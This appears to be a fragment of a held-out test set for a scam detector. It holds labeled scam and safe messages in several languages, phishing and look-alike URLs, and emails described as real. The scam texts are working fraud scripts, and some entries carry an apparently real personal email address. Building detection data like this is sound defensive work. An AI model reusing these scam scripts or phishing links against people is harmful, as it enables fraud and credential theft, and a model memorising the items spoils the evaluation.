    {'name': 'Language (held-out) 3: Le llamamos del IRS. Tiene una deuda pen', 'label': 'scam', 'mode': 'call', 'sender': '+1 305 555 0199', 'subject': '', 'body': 'Le llamamos del IRS. Tiene una deuda pendiente y hay una orden de arresto contra usted. Debe pagar hoy mismo con tarjetas de regalo.'},
    {'name': 'Language (held-out) 4: Oye, ¿me pasas la receta de la paella qu', 'label': 'safe', 'mode': 'sms', 'sender': 'Carlos', 'subject': '', 'body': 'Oye, ¿me pasas la receta de la paella que hiciste el sábado? Estaba buenísima.'},
    {'name': 'Language (held-out) 5: Su estado de cuenta de septiembre ya est', 'label': 'safe', 'mode': 'email', 'sender': 'Banco Santander <avisos@santander.com.mx>', 'subject': 'Estado de cuenta', 'body': 'Su estado de cuenta de septiembre ya está disponible en la app. Santander nunca le pedirá su clave por correo.'},
    {'name': 'Language (held-out) 6: آپ کا جاز کیش اکاؤنٹ بند کر دیا گیا ہے۔ ', 'label': 'scam', 'mode': 'sms', 'sender': '+92 345 7654321', 'subject': '', 'body': 'آپ کا جاز کیش اکاؤنٹ بند کر دیا گیا ہے۔ دوبارہ فعال کرنے کے لیے آپ کو موصول ہونے والا کوڈ ہمیں بتائیں۔'},
    {'name': 'Language (held-out) 7: میں ایف آئی اے سے بات کر رہا ہوں۔ آپ کے ', 'label': 'scam', 'mode': 'call', 'sender': '+92 51 1234567', 'subject': '', 'body': 'میں ایف آئی اے سے بات کر رہا ہوں۔ آپ کے نام پر مقدمہ درج ہے، گرفتاری سے بچنے کے لیے فوری رقم جمع کرائیں۔'},
    {'name': 'Language (held-out) 8: کل کرکٹ میچ کتنے بجے ہے؟ میں بھی آنا چاہ', 'label': 'safe', 'mode': 'sms', 'sender': 'Bhai', 'subject': '', 'body': 'کل کرکٹ میچ کتنے بجے ہے؟ میں بھی آنا چاہتا ہوں۔'},
    {'name': 'Language (held-out) 9: Mubarak ho! Aap ka number Jeeto Pakistan', 'label': 'scam', 'mode': 'sms', 'sender': '+92 333 0000000', 'subject': '', 'body': 'Mubarak ho! Aap ka number Jeeto Pakistan ki qurandazi mein inaam jeet gaya hai. 2000 rupay fees easypaisa par bhejein.'},
    {'name': 'Language (held-out) 10: Yaar kal office kitne baje pohanchna hai', 'label': 'safe', 'mode': 'sms', 'sender': 'Ahmed', 'subject': '', 'body': 'Yaar kal office kitne baje pohanchna hai? Meeting 10 baje hai na?'},
    {'name': 'Language (held-out) 11: पीएम किसान योजना: आपकी 6000 रुपये की किस', 'label': 'scam', 'mode': 'sms', 'sender': 'AX-PMKISN', 'subject': '', 'body': 'पीएम किसान योजना: आपकी 6000 रुपये की किस्त रुकी हुई है। तुरंत भुगतान प्राप्त करने के लिए 99 रुपये शुल्क यूपीआई से भेजें।'},
    {'name': 'Language (held-out) 12: मैं सीबीआई अधिकारी बोल रहा हूँ, आप डिजिट', 'label': 'scam', 'mode': 'call', 'sender': '+91 98765 43210', 'subject': '', 'body': 'मैं सीबीआई अधिकारी बोल रहा हूँ, आप डिजिटल अरेस्ट में हैं। किसी को मत बताइए और तुरंत पैसे ट्रांसफर कीजिए।'},
    {'name': 'Language (held-out) 13: बेटा खाना खा लिया? शाम को फ़ोन करना।', 'label': 'safe', 'mode': 'sms', 'sender': 'Mummy', 'subject': '', 'body': 'बेटा खाना खा लिया? शाम को फ़ोन करना।'},
    {'name': 'Language (held-out) 14: आपके खाते से 500 रुपये डेबिट हुए। यदि यह', 'label': 'safe', 'mode': 'sms', 'sender': 'JM-HDFCBK', 'subject': '', 'body': 'आपके खाते से 500 रुपये डेबिट हुए। यदि यह आपने नहीं किया तो बैंक की आधिकारिक हेल्पलाइन पर कॉल करें।'},
    {'name': 'Language (held-out) 15: مبروك! لقد ربحت جائزة بقيمة 10000 ريال. ', 'label': 'scam', 'mode': 'sms', 'sender': '+966 55 123 4567', 'subject': '', 'body': 'مبروك! لقد ربحت جائزة بقيمة 10000 ريال. ادفع رسوم التحويل الآن لاستلامها.'},
    {'name': 'Language (held-out) 16: هل ستأتي إلى العشاء الليلة؟', 'label': 'safe', 'mode': 'sms', 'sender': 'Sara', 'subject': '', 'body': 'هل ستأتي إلى العشاء الليلة؟'},
    {'name': 'Language (held-out) 17: Votre compte Ameli a été suspendu. Cliqu', 'label': 'scam', 'mode': 'sms', 'sender': '+33 6 12 34 56 78', 'subject': '', 'body': 'Votre compte Ameli a été suspendu. Cliquez sur le lien pour mettre à jour vos informations immédiatement.'},
    {'name': 'Language (held-out) 18: Seu CPF foi bloqueado. Pague a taxa de r', 'label': 'scam', 'mode': 'sms', 'sender': '+55 11 91234 5678', 'subject': '', 'body': 'Seu CPF foi bloqueado. Pague a taxa de regularização via PIX hoje mesmo para evitar processo.'},
    {'name': 'Language (held-out set 2) 1: Su código de verificación es 482913. No ', 'label': 'safe', 'mode': 'sms', 'sender': 'BancoAzteca', 'subject': '', 'body': 'Su código de verificación es 482913. No lo comparta con nadie, ni con personal del banco.'},
    {'name': 'Language (held-out set 2) 2: Su paquete fue entregado hoy a las 14:32', 'label': 'safe', 'mode': 'sms', 'sender': 'Amazon', 'subject': '', 'body': 'Su paquete fue entregado hoy a las 14:32. Gracias por comprar con nosotros.'},
    {'name': 'Language (held-out set 2) 3: Hola, soy tu hijo, perdí mi celular y es', 'label': 'scam', 'mode': 'sms', 'sender': '+57 300 555 1212', 'subject': '', 'body': 'Hola, soy tu hijo, perdí mi celular y este es mi nuevo número. Tuve un accidente, necesito que me transfieras dinero hoy, no le digas a papá.'},
    {'name': 'Language (held-out set 2) 4: Felicidades! Ha sido seleccionado para r', 'label': 'scam', 'mode': 'sms', 'sender': '+1 786 555 0142', 'subject': '', 'body': 'Felicidades! Ha sido seleccionado para recibir un bono del gobierno de $1,200. Verifique sus datos aquí: https://bono-gobierno.co/registro'},
    {'name': 'Language (held-out set 2) 5: آپ کا تصدیقی کوڈ 5521 ہے۔ یہ کوڈ کسی کے ', 'label': 'safe', 'mode': 'sms', 'sender': 'UBL', 'subject': '', 'body': 'آپ کا تصدیقی کوڈ 5521 ہے۔ یہ کوڈ کسی کے ساتھ شیئر نہ کریں۔'},
    {'name': 'Language (held-out set 2) 6: آپ کا پارسل کسٹم میں روکا گیا ہے۔ ڈیلیور', 'label': 'scam', 'mode': 'sms', 'sender': 'TCS', 'subject': '', 'body': 'آپ کا پارسل کسٹم میں روکا گیا ہے۔ ڈیلیوری کے لیے 350 روپے فیس فوری ادا کریں: http://tcs-delivery-pk.top'},
    {'name': 'Language (held-out set 2) 7: Main Jazz company se bol raha hoon, aap ', 'label': 'scam', 'mode': 'call', 'sender': '+92 21 3456789', 'subject': '', 'body': 'Main Jazz company se bol raha hoon, aap ka SIM band hone wala hai. Tasdeeq ke liye jo code aaya hai woh bata dein.'},
    {'name': 'Language (held-out set 2) 8: Bhai main pohanch gaya, kal milte hain i', 'label': 'safe', 'mode': 'sms', 'sender': 'Bhai', 'subject': '', 'body': 'Bhai main pohanch gaya, kal milte hain inshallah.'},
    {'name': 'Language (held-out set 2) 9: आपका ओटीपी 734512 है। इसे किसी के साथ शे', 'label': 'safe', 'mode': 'sms', 'sender': 'AD-HDFCBK', 'subject': '', 'body': 'आपका ओटीपी 734512 है। इसे किसी के साथ शेयर न करें। - HDFC बैंक'},
    {'name': 'Language (held-out set 2) 10: बधाई हो! आपने कौन बनेगा करोड़पति लॉटरी म', 'label': 'scam', 'mode': 'sms', 'sender': '+91 70000 12345', 'subject': '', 'body': 'बधाई हो! आपने कौन बनेगा करोड़पति लॉटरी में 25 लाख रुपये जीते हैं। इनाम पाने के लिए 5000 रुपये शुल्क भेजें।'},
    {'name': 'Language (held-out set 2) 11: नमस्ते, मैं कूरियर कंपनी से बोल रहा हूँ।', 'label': 'scam', 'mode': 'call', 'sender': '+91 80 1234 5678', 'subject': '', 'body': 'नमस्ते, मैं कूरियर कंपनी से बोल रहा हूँ। आपके नाम के पार्सल में ड्रग्स मिले हैं, पुलिस केस बनेगा। तुरंत पैसे ट्रांसफर करें।'},
    {'name': 'Language (held-out set 2) 12: कल शाम को पार्टी में आ रहे हो ना? केक मै', 'label': 'safe', 'mode': 'sms', 'sender': 'Priya', 'subject': '', 'body': 'कल शाम को पार्टी में आ रहे हो ना? केक मैं ला रही हूँ।'},
    {'name': 'Language (held-out set 2) 13: Votre colis est en attente. Des frais de', 'label': 'scam', 'mode': 'sms', 'sender': 'La Poste', 'subject': '', 'body': 'Votre colis est en attente. Des frais de livraison de 1,45 EUR sont requis : https://laposte-suivi.info'},
    {'name': 'Language (held-out set 2) 14: Olá! A sua encomenda está retida na alfâ', 'label': 'scam', 'mode': 'sms', 'sender': '+351 912 345 678', 'subject': '', 'body': 'Olá! A sua encomenda está retida na alfândega. Pague a taxa de 2,99 EUR em https://ctt-entrega.top'},
    {'name': 'Language (held-out set 2) 15: Filho, não esquece de comprar pão quando', 'label': 'safe', 'mode': 'sms', 'sender': 'Mãe', 'subject': '', 'body': 'Filho, não esquece de comprar pão quando voltar.'},
    {'name': 'Language (held-out set 2) 16: تم إيقاف حسابك البنكي. يرجى إرسال رمز ال', 'label': 'scam', 'mode': 'sms', 'sender': '+971 50 123 4567', 'subject': '', 'body': 'تم إيقاف حسابك البنكي. يرجى إرسال رمز التحقق الذي وصلك لإعادة التفعيل فوراً.'},
    {'name': 'Language (held-out set 3) 1: Santander: su clave de acceso temporal e', 'label': 'safe', 'mode': 'sms', 'sender': 'Santander', 'subject': '', 'body': 'Santander: su clave de acceso temporal es 9931. Nunca la comparta. Si no la solicitó, ignore este mensaje.'},
    {'name': 'Language (held-out set 3) 2: Mamá, se me rompió el teléfono, este es ', 'label': 'scam', 'mode': 'sms', 'sender': '+34 722 000 111', 'subject': '', 'body': 'Mamá, se me rompió el teléfono, este es mi número nuevo. ¿Me puedes hacer una transferencia urgente? Te lo devuelvo mañana.'},
    {'name': 'Language (held-out set 3) 3: Le hablamos de Migración. Hay un problem', 'label': 'scam', 'mode': 'call', 'sender': '+1 915 555 0177', 'subject': '', 'body': 'Le hablamos de Migración. Hay un problema con sus documentos y una orden de arresto. Para evitarlo debe pagar hoy una multa con tarjetas de regalo.'},
    {'name': 'Language (held-out set 3) 4: آپ کا ون ٹائم پاس ورڈ 6612 ہے۔ بینک کبھی', 'label': 'safe', 'mode': 'sms', 'sender': 'Meezan Bank', 'subject': '', 'body': 'آپ کا ون ٹائم پاس ورڈ 6612 ہے۔ بینک کبھی یہ کوڈ نہیں مانگتا، کسی کو نہ بتائیں۔'},
    {'name': 'Language (held-out set 3) 5: امی میرا فون گم ہو گیا ہے یہ نیا نمبر ہے', 'label': 'scam', 'mode': 'sms', 'sender': '+92 311 9876543', 'subject': '', 'body': 'امی میرا فون گم ہو گیا ہے یہ نیا نمبر ہے۔ ہسپتال میں ہوں، فوری 20000 روپے ایزی پیسہ کر دیں، ابو کو مت بتانا۔'},
    {'name': 'Language (held-out set 3) 6: Aap ka order dispatch ho gaya hai aur ka', 'label': 'safe', 'mode': 'sms', 'sender': 'Daraz', 'subject': '', 'body': 'Aap ka order dispatch ho gaya hai aur kal tak deliver ho jayega. Shukriya!'},
    {'name': 'Language (held-out set 3) 7: Aap ka parcel custom mein ruka hua hai. ', 'label': 'scam', 'mode': 'sms', 'sender': '+92 302 1112223', 'subject': '', 'body': 'Aap ka parcel custom mein ruka hua hai. 500 rupay fees jama karayen warna wapas chala jayega.'},
    {'name': 'Language (held-out set 3) 8: SBI: आपका लॉगिन ओटीपी 120934 है। बैंक कभ', 'label': 'safe', 'mode': 'sms', 'sender': 'SBI', 'subject': '', 'body': 'SBI: आपका लॉगिन ओटीपी 120934 है। बैंक कभी ओटीपी नहीं माँगता, इसे किसी को न बताएं।'},
    {'name': 'Language (held-out set 3) 9: आपका बिजली कनेक्शन आज रात 9:30 बजे काट द', 'label': 'scam', 'mode': 'sms', 'sender': '+91 99887 66554', 'subject': '', 'body': 'आपका बिजली कनेक्शन आज रात 9:30 बजे काट दिया जाएगा। तुरंत इस नंबर पर कॉल करें और भुगतान करें।'},
    {'name': 'Language (held-out set 3) 10: Bonjour, activité inhabituelle détectée ', 'label': 'scam', 'mode': 'sms', 'sender': '+33 7 55 44 33 22', 'subject': '', 'body': 'Bonjour, activité inhabituelle détectée sur votre compte. Confirmez vos informations via ce lien pour éviter le blocage : https://secure-banque.info'},
    # — links and QR codes (mode "link") —
    {'name': 'Link (held-out) 1: https://www.paypal.com.account-review.help/si', 'label': 'scam', 'mode': 'link', 'sender': '', 'body': 'https://www.paypal.com.account-review.help/signin'},
    {'name': 'Link (held-out) 2: http://secure-chase.com-login.icu/verify?id=8', 'label': 'scam', 'mode': 'link', 'sender': '', 'body': 'http://secure-chase.com-login.icu/verify?id=88213'},
    {'name': 'Link (held-out) 3: https://usps.com@track-redelivery.top/pay', 'label': 'scam', 'mode': 'link', 'sender': '', 'body': 'https://usps.com@track-redelivery.top/pay'},
    {'name': 'Link (held-out) 4: https://wallet-connect-airdrop.pages.dev/clai', 'label': 'scam', 'mode': 'link', 'sender': '', 'body': 'https://wallet-connect-airdrop.pages.dev/claim'},
    {'name': 'Link (held-out) 5: https://metamask-io-restore.web.app/seed', 'label': 'scam', 'mode': 'link', 'sender': '', 'body': 'https://metamask-io-restore.web.app/seed'},
    {'name': 'Link (held-out) 6: https://amazon-refund-billing-support.com/', 'label': 'scam', 'mode': 'link', 'sender': '', 'body': 'https://amazon-refund-billing-support.com/'},
    {'name': 'Link (held-out) 7: https://bit.ly/3xYzAbC', 'label': 'scam', 'mode': 'link', 'sender': '', 'body': 'https://bit.ly/3xYzAbC'},
    {'name': 'Link (held-out) 8: http://45.133.1.92:8080/bank/login.php', 'label': 'scam', 'mode': 'link', 'sender': '', 'body': 'http://45.133.1.92:8080/bank/login.php'},
    {'name': 'Link (held-out) 9: https://www.google.com/url?q=https://netflix-', 'label': 'scam', 'mode': 'link', 'sender': '', 'body': 'https://www.google.com/url?q=https://netflix-billing-update.xyz/account'},
    {'name': 'Link (held-out) 10: https://ezpass-toll-unpaid.com/pay-now', 'label': 'scam', 'mode': 'link', 'sender': '', 'body': 'https://ezpass-toll-unpaid.com/pay-now'},
    {'name': 'Link (held-out) 11: upi://pay?pa=refund.helpdesk@ybl&pn=Refund%20', 'label': 'scam', 'mode': 'link', 'sender': '', 'body': 'upi://pay?pa=refund.helpdesk@ybl&pn=Refund%20Desk&am=4999'},
    {'name': 'Link (held-out) 12: https://docs.google.com/forms/d/e/1FAIpQLSf-p', 'label': 'scam', 'mode': 'link', 'sender': '', 'body': 'https://docs.google.com/forms/d/e/1FAIpQLSf-paypal-verify/viewform'},
    {'name': 'Link (held-out) 13: https://www.amazon.com/gp/your-account/order-', 'label': 'safe', 'mode': 'link', 'sender': '', 'body': 'https://www.amazon.com/gp/your-account/order-history'},
    {'name': 'Link (held-out) 14: https://www.chase.com/personal/checking', 'label': 'safe', 'mode': 'link', 'sender': '', 'body': 'https://www.chase.com/personal/checking'},
    {'name': 'Link (held-out) 15: https://github.com/anthropics/claude-code', 'label': 'safe', 'mode': 'link', 'sender': '', 'body': 'https://github.com/anthropics/claude-code'},
    {'name': 'Link (held-out) 16: https://en.wikipedia.org/wiki/Phishing', 'label': 'safe', 'mode': 'link', 'sender': '', 'body': 'https://en.wikipedia.org/wiki/Phishing'},
    {'name': 'Link (held-out) 17: https://www.irs.gov/payments', 'label': 'safe', 'mode': 'link', 'sender': '', 'body': 'https://www.irs.gov/payments'},
    {'name': 'Link (held-out) 18: https://mohsin-portfolio.netlify.app/', 'label': 'safe', 'mode': 'link', 'sender': '', 'body': 'https://mohsin-portfolio.netlify.app/'},
    {'name': 'Link (held-out) 19: https://zoom.us/j/9876543210?pwd=abc123', 'label': 'safe', 'mode': 'link', 'sender': '', 'body': 'https://zoom.us/j/9876543210?pwd=abc123'},
    {'name': 'Link (held-out) 20: https://www.daraz.pk/products/phone-case-i123', 'label': 'safe', 'mode': 'link', 'sender': '', 'body': 'https://www.daraz.pk/products/phone-case-i1234.html'},
    {'name': 'Link (held-out) 21: https://maps.google.com/?q=Alexandria+VA', 'label': 'safe', 'mode': 'link', 'sender': '', 'body': 'https://maps.google.com/?q=Alexandria+VA'},
    {'name': 'Link (held-out) 22: https://accounts.google.com/signin/v2/identif', 'label': 'safe', 'mode': 'link', 'sender': '', 'body': 'https://accounts.google.com/signin/v2/identifier'},
    {'name': 'Link: Cyrillic look-alike PayPal', 'label': 'scam', 'mode': 'link', 'sender': '', 'body': 'https://раураl.com/signin'},
    {'name': 'Link: genuine PayPal sign-in', 'label': 'safe', 'mode': 'link', 'sender': '', 'body': 'https://www.paypal.com/signin'},
    {'name': 'Link: shop UPI QR (genuine)', 'label': 'safe', 'mode': 'link', 'sender': '', 'body': 'upi://pay?pa=chaiwala@okaxis&pn=Sharma%20Tea%20Stall&am=40'},
    {'name': 'Link: QR on an email asking to re-verify (quishing)', 'label': 'scam', 'mode': 'link', 'sender': '', 'body': 'QR code: https://microsoft-365-verify.firebaseapp.com/login?user=ali'},
    {'name': 'Message with a redirect-wrapped link', 'label': 'scam', 'mode': 'sms', 'sender': '', 'body': 'Your package is held. Pay the fee: https://www.google.com/url?q=https%3A%2F%2Fusps-redelivery-fee.top%2Fpay'},
    # — real emails sent to the author (Oct 2026), plus genuine look-alikes —
    {'name': "Email: fake WhatsApp 'request for correspondence' (real, Oct 2026)", 'label': 'scam', 'mode': 'email', 'sender': 'Whats App <yoalbl@bilfohau.my>', 'subject': 'You have been sent a request for correspondence', 'body': 'WhatsApp. You have been sent a request for correspondence. Open. You received this notification because you were sent a correspondence request. If you no longer wish to receive email notifications, unsubscribe here. Get the WhatsApp app: GPlay AppStore', 'headers': {'reply_to': 'onimtmxgyj@rambler.ru'}},
    {'name': 'Email: fake SiriusXM payment failure (real, Oct 2026)', 'label': 'scam', 'mode': 'email', 'sender': 'SiriusXM', 'subject': 'jlee4817.mail, Your Account "Sirius XM "Will Be Removed Today', 'body': 'Payment attempt failure while renewing your subscription for Siriusxm. Your SXM Subscription Has Expired Today! Dear Customer, We Failed To Renew Your SXM Membership. Name: jlee4817.mail. Subscription ID: ID#66319089-428. We tried to renew your subscription at the end of each billing cycle, but your monthly payment has failed. If you wish to renew your subscription click on the link below. UPDATE MY PAYMENT DETAILS'},
    {'name': "Email PDF: fake cloud storage 'payment declined' (real, Oct 2026)", 'label': 'scam', 'mode': 'email', 'sender': '𝗣aym𝗲nt_Declin𝗲d <jlee4817.mail.5804@ycmoggbfves.event-manager.hiartomaro.my.id>', 'subject': 'jlee4817.mail, Your Cloud Account has been locked on 10-20-2026. Your photos and videos will be removed!⚠ .', 'body': "Payment Issue - Cloud Storage\nDear User,\nWe encountered an issue while attempting to renew your Cloud Storage subscription.\nUnfortunately, your payment method has expired. To ensure your Cloud continues without interruption, please update your payment details.\n96% Storage Used\nSubscription ID: 9764493\nProduct: Cloud Storage Premium\nExpiration Date: 10-20-2026\nYou may not be able to send or receive emails. To continue using cloud services, please free up space or upgrade your storage. Your files are safe for now, but may be deleted if the cloud is not refreshed.\nUpgrade now and get an extra 50 GB bonus storage. Don't wait!\nThis special offer expires in 4 minutes et 39 seconds\nUpdate Payment Details\n\nLinks in this email:\nhttps://storage.googleapis.com/betweenthemiseasy/trustedbycommunities.html#4qgMnm253932bPIU1532airoeihdel2247", 'headers': {'to': 'jlee4817.mail@gmail.com'}, 'expect_category': 'Billing / subscription scam'},
    {'name': "Email PDF: 'Harvard reveals' miracle eye cure (real, Oct 2026)", 'label': 'scam', 'mode': 'email', 'sender': '20/20 𝚅𝚒𝚜𝚒𝚘𝚗 𝚆𝚒𝚛𝚎 <jlee4817.mail.1404@rcwfbvocaxy.power-sprint.sozagivaefic.web.id>', 'subject': 'Blurry vision or cataracts? Harvard reveals simple home protocol', 'body': 'If your vision is getting blurry or you suffer from cataracts, read this immediately.\nMillions of Americans are told that failing eyesight, glaucoma, and optic nerve damage are permanent consequences of aging.\nGroundbreaking research from the Harvard Medical School Department of Ophthalmology has proven that vision loss can be completely reversed at home without surgeries, painful eye injections, or expensive glasses.\nA simple 10-second morning protocol that rejuvenates 96% of damaged eye cells.\nThe unedited CBS News presentation reveals the exact step-by-step instructions:\nWatch the Harvard vision restoration video here >>\n\nLinks in this email:\nhttps://storage.googleapis.com/betweenthemiseasy/trustedbycommunities.html#4vnbTu253015ubRG4108', 'headers': {'to': 'jlee4817.mail@gmail.com'}, 'expect_category': 'Health / miracle-cure spam'},
    {'name': "Email PDF: fake Messenger 'someone nearby wants to chat' (real, Oct 2026)", 'label': 'scam', 'mode': 'email', 'sender': '🟣 Messenger <wyct@pluzovolee.my>', 'subject': 'Reply to an important message', 'body': 'messenger New activity\nYou have 1 new message request\nSomeone connected to your area and mutual contacts wants to reach you.\nAnna\nSuggested from nearby people\n2 mutual connections\nHi, I think I saw your comment before and then your profile popped up here. You seem familiar Want to chat?\nOpen in Messenger\nReview request\n\nLinks in this email:\nhttp://66vp8yv57rw7q1.pluzovolee.my/cck6p?a6sAFg3nbpVRLxlGNQ6Li9T16e9%2FmkNFjEiHy3Ni9QR9QY2pqimFVLWeTHxyQbOnLWecf8xJvrhXSfFHl5k7PDjFYIw8pthlPc%2BhqX8KuvjnSc5UlSNx5NilKbUf', 'headers': {'reply_to': 'Reply <onimtmxgyj@rambler.ru>', 'to': 'jlee4817.mail@gmail.com'}},
    {'name': 'Email PDF: genuine Trailhead Biosystems form receipt (tracking links)', 'label': 'safe', 'mode': 'email', 'sender': 'Trailhead Biosystems <hello@trailbio.com>', 'subject': 'Trailhead Biosystems Form Submission', 'body': "Hello Jordan,\nThank you for filling out the Trailhead Biosystems online contact form.\nJust so you know - we've opened a ticket for you to track our team's progress on your request.\nYou can use the email address used on the form (jlee4817.mail@gmail.com) to log into the system at the link below:\nhttps://go.trailbio.com/tickets-view\nRequest details\nContact email: jlee4817.mail@gmail.com\nBest,\nThe Trailhead Team\n\nLinks in this email:\nhttps://go.trailbio.com/e3t/Ctc/I9+113/d4GKvt04/MWrs--Qk764VMNdXh6grZXRW5g6HvJ5WkyLHN7dHCv23lYM-W6N1vHY6lZ3pXW58c3983l-9jBW97Y2k55dWQFMW1zrR_g1kS5T7W8Cpj308JnxQtW2QrTbg7TBYMRW27JXQv3yzX52W1TJh-b2TQlbHW7lwTmG3hzdGvW8Q_HM87txfXPW19GX5S8x\nhttps://go.trailbio.com/hs/preferences-center/en/direct?data=W2nXS-N30h-MwW4rFt_L34yL58W3VP8KQ4r72fwW4klYB73Fd1dDW45QpFs24-nXVW2KFfrs2RMl0fW3S-pzx3JRpd9W1VytzP1QjfkvW2HDGkk38cS9jW4tzx2Y2YPHGBW2v-yJh3D_dBmW1QCWFZ2vCZrbW2t7z7g2qQmvHW1S1WtC3d2JNMW1Q2wvb2HTZ9CW255qhg385cJk", 'headers': {'reply_to': 'hello@trailbio.com', 'to': 'jlee4817.mail@gmail.com'}},
    {'name': "PDF: genuine IT Specialist job description (benefits list, 'Nobel Prize')", 'label': 'safe', 'mode': 'sms', 'sender': '', 'body': "IT Specialist. Full Time, Beachwood, OH. Remote. $70,000-$75,000 per year. About Us: Trailhead Biosystems merges developmental biology and cell therapeutics with cutting-edge hardware. Building on Dr. Yamanaka's Nobel Prize-winning iPSC technology, we unlock the potential of human iPSC lines. Responsibilities: administer Microsoft 365, endpoint protection, MFA enforcement and conditional-access policies; access revoked immediately upon staff or contractor departure; manage email authentication controls (SPF, DKIM, DMARC) and anti-phishing policies. Benefits: 401(k), 401(k) matching, Dental insurance, Health insurance, Life insurance, Paid time off, Parental leave, Vision insurance. Preferred Qualifications: exposure to securing AI/LLM tooling."},
    {'name': 'Email: genuine newsletter in plain Messenger-named paper', 'label': 'safe', 'mode': 'email', 'sender': 'The Daily Messenger <news@dailymessenger.com>', 'subject': "Today's headlines", 'body': "Good morning. Here are today's top local stories: https://www.dailymessenger.com/news"},
    {'name': 'Email: genuine iCloud storage almost full', 'label': 'safe', 'mode': 'email', 'sender': 'iCloud <noreply@email.apple.com>', 'subject': 'Your iCloud storage is almost full', 'body': 'Hi Jordan, your iCloud storage is almost full. You can upgrade to iCloud+ in Settings on your iPhone, or manage your storage at any time.'},
    {'name': 'WhatsApp: task scam (like videos, Telegram receptionist)', 'label': 'scam', 'mode': 'sms', 'sender': '+1 (213) 555-0187', 'body': 'Hello dear, I am Linda from Amazon recruitment team\n\nWe have a remote part time job, earn $300-$800 daily just liking videos\n\nContact our receptionist on Telegram to start: https://t.me/amz_task_hr\nSend your name and age', 'expect_category': 'Job / recruitment scam'},
    {'name': "WhatsApp: 'Hi Mum, new number' money request", 'label': 'scam', 'mode': 'sms', 'sender': '+44 7700 900123', 'body': "Hi mum, I dropped my phone in the toilet, this is my new number. Can you transfer £480 to pay a bill urgently? I'll pay you back tomorrow x", 'expect_category': 'Family-emergency scam'},
    {'name': "WhatsApp: Urdu-English 'new number' JazzCash request", 'label': 'scam', 'mode': 'sms', 'sender': 'Mom', 'body': 'Hi beta, I lost my phone, this is my new number\n\nCan you send me Rs 50,000 urgently on JazzCash 03001234567? I will return tomorrow'},
    {'name': "WhatsApp: code 'sent by mistake' takeover", 'label': 'scam', 'mode': 'sms', 'sender': '+234 803 555 0142', 'body': "Hi, sorry I sent you a 6 digit code by mistake, please can you send it to me? It's urgent", 'expect_category': 'Account or code (OTP) scam'},
    {'name': 'Instagram DM: fake copyright appeal', 'label': 'scam', 'mode': 'sms', 'sender': 'meta.support.appeal', 'body': 'Your account has been flagged for copyright infringement. Submit an appeal within 24 hours or your account will be permanently disabled: https://meta-appeal-center.com/form'},
    {'name': "Messenger: 'is this you in this video?'", 'label': 'scam', 'mode': 'sms', 'sender': 'Alex', 'body': 'is this you in this video?? 😳 https://bit.ly/3xYzAbc'},
    {'name': "WhatsApp: friend's genuine new number", 'label': 'safe', 'mode': 'sms', 'sender': '+1 571 555 0110', 'body': "Hey it's Sam, this is my new number, save it! See you Saturday at the game"},
    {'name': 'LinkedIn/WhatsApp: genuine recruiter', 'label': 'safe', 'mode': 'sms', 'sender': 'Priya Shah', 'body': "Hi Jordan, I'm a recruiter at Deloitte. Are you open to a cybersecurity analyst role in Arlington? Happy to share the job description and set up a call."},
    {'name': 'WhatsApp: family chat', 'label': 'safe', 'mode': 'sms', 'sender': 'Mom', 'body': "Hi beta, did you eat? Call me when you're free. I like videos about cooking, I'll send you one"},
    {'name': 'WhatsApp: genuine registration code', 'label': 'safe', 'mode': 'sms', 'sender': 'WhatsApp', 'body': "Your WhatsApp code: 123-456. You can also tap on this link to verify your phone: v.whatsapp.com/123456. Don't share this code with others"},
    {'name': 'Chat: borrowed book', 'label': 'safe', 'mode': 'sms', 'sender': 'Sam', 'body': "Can you send it back to me when you're done with the book? No rush"},
    {'name': "DM (set 2): Hi! I'm Sarah, HR at TikTok Shop. Part time onli", 'label': 'scam', 'mode': 'sms', 'sender': '+62 812 3456 7890', 'body': "Hi! I'm Sarah, HR at TikTok Shop. Part time online job: rating products from home, earn 200-500 USD per day. Interested? Reply YES"},
    {'name': 'DM (set 2): Hello mom, new number, my old phone broke. Need ', 'label': 'scam', 'mode': 'sms', 'sender': '+1 (646) 555-0199', 'body': 'Hello mom, new number, my old phone broke. Need help paying a bill today, can you send $650 via Zelle? Will explain later'},
    {'name': 'DM (set 2): Hey bro I accidentally sent my verification code', 'label': 'scam', 'mode': 'sms', 'sender': 'Daniel', 'body': 'Hey bro I accidentally sent my verification code to your number, can you forward it to me? 🙏'},
    {'name': 'DM (set 2): Your Instagram account has been reported for vio', 'label': 'scam', 'mode': 'sms', 'sender': 'instagram_help_desk', 'body': 'Your Instagram account has been reported for violating our community guidelines and will be deleted in 24 hours. Verify here: https://instagram-verify-badge.com/appeal'},
    {'name': 'DM (set 2): OMG look who i found in this video 😱 https://tin', 'label': 'scam', 'mode': 'sms', 'sender': 'Maria', 'body': 'OMG look who i found in this video 😱 https://tinyurl.com/vid-xx9'},
    {'name': 'DM (set 2): Good day, I am investment mentor. Our members ge', 'label': 'scam', 'mode': 'sms', 'sender': '+44 7911 123456', 'body': 'Good day, I am investment mentor. Our members get guaranteed returns of 15% weekly with crypto trading. Join our WhatsApp group'},
    {'name': 'DM (set 2): Your page will be permanently disabled due to co', 'label': 'scam', 'mode': 'sms', 'sender': 'Facebook Security', 'body': 'Your page will be permanently disabled due to copyright infringement. Submit an appeal: https://fb-copyright-help.net'},
    {'name': 'DM (set 2): Salam bhai, this is my new number, old one stopp', 'label': 'safe', 'mode': 'sms', 'sender': 'Ahmed', 'body': 'Salam bhai, this is my new number, old one stopped working. Eid mubarak!'},
    {'name': 'DM (set 2): Practice moved to 6pm. Please send the code for ', 'label': 'safe', 'mode': 'sms', 'sender': 'Coach Mike', 'body': 'Practice moved to 6pm. Please send the code for the gym door back to me after you lock up, thanks'},
    {'name': 'DM (set 2): Just a reminder that your story highlights are r', 'label': 'safe', 'mode': 'sms', 'sender': 'Instagram', 'body': 'Just a reminder that your story highlights are ready to view.'},
    {'name': 'DM (set 2): Haha I was rating restaurants on Yelp all day. W', 'label': 'safe', 'mode': 'sms', 'sender': 'Lena', 'body': 'Haha I was rating restaurants on Yelp all day. Want to get dinner Friday?'},
    {'name': "DM (set 2): Hi it's Jess from the leasing office, your packa", 'label': 'safe', 'mode': 'sms', 'sender': '+1 703 555 0144', 'body': "Hi it's Jess from the leasing office, your package arrived. Pick it up anytime before 7"},
    {'name': 'DM (set 3): Assalam o alaikum! Online part time job availabl', 'label': 'scam', 'mode': 'sms', 'sender': '+92 315 7654321', 'body': 'Assalam o alaikum! Online part time job available, simple tasks on your mobile, earn Rs 3000 to 8000 daily. Contact our HR manager: wa.me/923157654321'},
